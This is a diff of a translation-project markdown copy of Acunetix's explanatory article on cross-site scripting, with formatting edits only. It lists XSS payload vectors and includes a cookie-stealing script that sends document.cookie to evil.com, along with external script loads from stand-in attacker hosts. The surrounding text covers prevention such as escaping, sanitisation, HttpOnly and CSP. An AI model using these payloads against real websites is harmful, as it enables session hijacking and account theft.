@@ -1,7 +1,7 @@
 > * 原文地址：[Cross-site Scripting (XSS)](https://www.acunetix.com/websitesecurity/cross-site-scripting/)
 > * 原文作者：[Acunetix](https://www.acunetix.com/)
 > * 译文出自：[掘金翻译计划](https://github.com/xitu/gold-miner)
-> * 本文永久链接：[https://github.com/xitu/gold-miner/blob/master/article/2021/.md](https://github.com/xitu/gold-miner/blob/master/article/2021/.md)
+> * 本文永久链接：[https://github.com/xitu/gold-miner/blob/master/article/2021/cross-site-scripting.md](https://github.com/xitu/gold-miner/blob/master/article/2021/cross-site-scripting.md)
 > * 译者：
 > * 校对者：
 
@@ -43,7 +43,7 @@ For step one to be possible, the vulnerable website needs to directly include us
 
 The following is a snippet of server-side pseudocode that is used to display the most recent comment on a web page:
 
-```
+```python
 print "<html>"
 print "<h1>Most recent comment</h1>"
 print database.latestComment
@@ -52,13 +52,13 @@ print "</html>"
 
 The above script simply takes the latest comment from a database and includes it in an HTML page. It assumes that the comment printed out consists of only text and contains no HTML tags or other code. It is vulnerable to XSS, because an attacker could submit a comment that contains a malicious payload, for example:
 
-```
+```html
 <script>doSomethingEvil();</script>
 ```
 
 The web server provides the following HTML code to users that visit this web page:
 
-```
+```html
 <html>
 <h1>Most recent comment</h1>
 <script>doSomethingEvil();</script>
@@ -71,7 +71,7 @@ When the page loads in the victim’s browser, the attacker’s malicious script
 
 Criminals often use XSS to steal cookies. This allows them to impersonate the victim. The attacker can send the cookie to their own server in many ways. One of them is to execute the following client-side script in the victim’s browser:
 
-```
+```html
 <script>
 window.location="http://evil.com/?cookie=" + document.cookie
 </script>
@@ -94,11 +94,11 @@ To learn more about how XSS attacks are conducted, you can refer to an article t
 
 The following is a list of common XSS attack vectors that an attacker could use to compromise the security of a website or web application through an XSS attack. A more extensive list of XSS payload examples is maintained by the OWASP organization: [XSS Filter Evasion Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet).
 
-### <script> tag
+### `<script>` tag
 
 The `<script>` tag is the most straightforward XSS payload. A `script` tag can reference external JavaScript code or you can embed the code within the `script` tag itself.
 
-```
+```html
 <!-- External script -->
 <script src=http://evil.com/xss.js></script>
 <!-- Embedded script -->
@@ -109,25 +109,25 @@ The `<script>` tag is the most straightforward XSS payload. A `script` tag can r
 
 JavaScript event attributes such as `onload` and `onerror` can be used in many different tags. This is a very popular XSS attack vector.
 
-```
+```html
 <!-- onload attribute in the <body> tag -->
 <body onload=alert("XSS")>
 ```
 
-### <body> tag
+### `<body>` tag
 
 An XSS payload can be delivered inside the `<body>` by using event attributes (see above) or other more obscure attributes such as the `background` attribute.
 
-```
+```html
 <!-- background attribute -->
 <body background="javascript:alert("XSS")">
 ```
 
-### <img> tag
+### `<img>` tag
 
 Some browsers execute JavaScript found in the `<img>` attributes.
 
-```
+```html
 <!-- <img> tag XSS -->
 <img src="javascript:alert("XSS");">
 <!--  tag XSS using lesser-known attributes -->
@@ -135,60 +135,60 @@ Some browsers execute JavaScript found in the `<img>` attributes.
 <img lowsrc="javascript:alert('XSS')">
 ```
 
-### <iframe> tag
+### `<iframe>` tag
 
 The `<iframe>` tag lets you embed another HTML page in the current page. An IFrame may contain JavaScript but JavaScript in the IFrame does not have access to the DOM of the parent page due to the Content Security Policy (CSP) of the browser. However, IFrames are still very effective for pulling off phishing attacks.
 
-```
+```html
 <!-- <iframe> tag XSS -->
 <iframe src="http://evil.com/xss.html">
 ```
 
-### <input> tag
+### `<input>` tag
 
 In some browsers, if the `type` attribute of the `<input>` tag is set to `image`, it can be manipulated to embed a script.
 
-```
+```html
 <!-- <input> tag XSS -->
 <input type="image" src="javascript:alert('XSS');">
 ```
 
-### <link> tag
+### `<link>` tag
 
 The `<link>` tag, which is often used to link to external style sheets, may contain a script.
 
-```
+```html
 <!-- <link> tag XSS -->
 <link rel="stylesheet" href="javascript:alert('XSS');">
 ```
 
-### <table> tag
+### `<table>` tag
 
 The background attribute of the `<table>` and `<td>` tags can be exploited to refer to a script instead of an image.
 
-```
+```html
 <!-- <table> tag XSS -->
 <table background="javascript:alert('XSS')">
 <!-- <td> tag XSS -->
 <td background="javascript:alert('XSS')">
 ```
 
-### <div> tag
+### `<div>` tag
 
 The `<div>` tag, similar to the <table> and `<td>` tags, can also specify a background and therefore embed a script.
 
-```
+```html
 <!-- <div> tag XSS -->
 <div style="background-image: url(javascript:alert('XSS'))">
 <!-- <div> tag XSS -->
 <div style="width: expression(alert('XSS'));">
 ```
 
-### <object> tag
+### `<object>` tag
 
 The `<object> tag` can be used to include a script from an external site.
 
-```
+```html
 <!-- <object> tag XSS -->
 <object type="text/x-scriptlet" data="http://hacker.com/xss.html">
 ```
@@ -215,14 +215,12 @@ Preventing Cross-site Scripting (XSS) is not easy. Specific prevention technique
 ### Step 1: Train and maintain awareness
 
 To keep your web application safe, everyone involved in building the web application must be aware of the risks associated with XSS vulnerabilities. You should provide suitable security training to all your developers, QA staff, DevOps, and SysAdmins. You can start by referring them to this page.
-
   
 ![Don’t trust any user input](https://www.acunetix.com/wp-content/uploads/2020/03/howto_xss_step2-150x150.png)
 
 ### Step 2: Don’t trust any user input
 
 Treat all user input as untrusted. Any user input that is used as part of HTML output introduces a risk of an XSS. Treat input from authenticated and/or internal users the same way that you treat public input.
-
   
 ![Use escaping/encoding](https://www.acunetix.com/wp-content/uploads/2020/03/howto_xss_step3-150x150.png)
 
@@ -236,14 +234,12 @@ Use an appropriate escaping/encoding technique depending on where user input is 
 ### Step 4: Sanitize HTML
 
 If the user input needs to contain HTML, you can’t escape/encode it because it would break valid tags. In such cases, use a trusted and verified library to parse and clean HTML. Choose the library depending on your development language, for example, HtmlSanitizer for .NET or SanitizeHelper for Ruby on Rails.
-
   
 ![Set the HttpOnly flag](https://www.acunetix.com/wp-content/uploads/2020/03/howto_xss_step5-150x150.png)
 
 ### Step 5: Set the HttpOnly flag
 
 To mitigate the consequences of a possible XSS vulnerability, set the HttpOnly flag for cookies. If you do, such cookies will not be accessible via client-side JavaScript.
-
   
 ![Use a Content Security Policy](https://www.acunetix.com/wp-content/uploads/2020/03/howto_xss_step6-150x150.png)
 
@@ -251,7 +247,6 @@ To mitigate the consequences of a possible XSS vulnerability, set the HttpOnly f
 
 To mitigate the consequences of a possible XSS vulnerability, also use a Content Security Policy (CSP). CSP is an HTTP response header that lets you declare the dynamic resources that are allowed to load depending on the request source.
 
-  
 ![Scan regularly (with Acunetix)](https://www.acunetix.com/wp-content/uploads/2020/03/howto_xss_step7-150x150.png)
 
 ### Step 7: Scan regularly (with Acunetix)
@@ -260,29 +255,27 @@ XSS vulnerabilities may be introduced by your developers or through external lib
 
 ## Frequently asked questions
 
-#### How does Cross-site Scripting work?
+**How does Cross-site Scripting work?**
 
 In a Cross-site Scripting attack (XSS), the attacker uses your vulnerable web page to deliver malicious JavaScript to your user. The user’s browser executes this malicious JavaScript on the user’s computer. Note that about one in three websites is vulnerable to Cross-site scripting.
 
 [Learn more about the current state of web security](https://www.acunetix.com/acunetix-web-application-vulnerability-report/).
 
-#### Why is Cross-site Scripting dangerous?
+**Why is Cross-site Scripting dangerous?**
 
 Even though a Cross-site Scripting attack happens in the user’s browser, it may affect your website or web application. For example, an attacker may use it to steal user credentials and log in to your website as that user. If that user is an administrator, the attacker gains control over your website.
 
 [See an example of a dangerous XSS attack from the past](https://www.acunetix.com/blog/articles/dangerous-xss-vulnerability-found-on-youtube-the-vulnerability-explained/)
 
-#### How to discover Cross-site Scripting?
+**How to discover Cross-site Scripting?**
 
 To discover Cross-site Scripting, you may either perform manual penetration testing or first use a vulnerability scanner. If you use a vulnerability scanner, it will save you a lot of time and money because your penetration testers can then focus on more challenging vulnerabilities.
 
 [Find out why it’s good to scan for vulnerabilities before hiring pen testers](https://www.acunetix.com/blog/web-security-zone/penetration-testing-vs-vulnerability-scanning/).
 
-#### How to protect against Cross-site Scripting?
+**How to protect against Cross-site Scripting?**
 
 To protect against Cross-site Scripting, you must scan your website or web application regularly or at least after every chance in the code. Then, your developers must correct the code to eliminate the vulnerability. Contrary to popular opinions, web application firewalls do not protect against Cross-site Scripting, they just make the attack more difficult – the vulnerability is still there.
-
-[See what Acunetix Premium can do for you](https://www.acunetix.com/product/premium/).
 
 > 如果发现译文存在错误或其他需要改进的地方，欢迎到 [掘金翻译计划](https://github.com/xitu/gold-miner) 对译文进行修改并 PR，也可获得相应奖励积分。文章开头的 **本文永久链接** 即为本文在 GitHub 上的 MarkDown 链接。
 
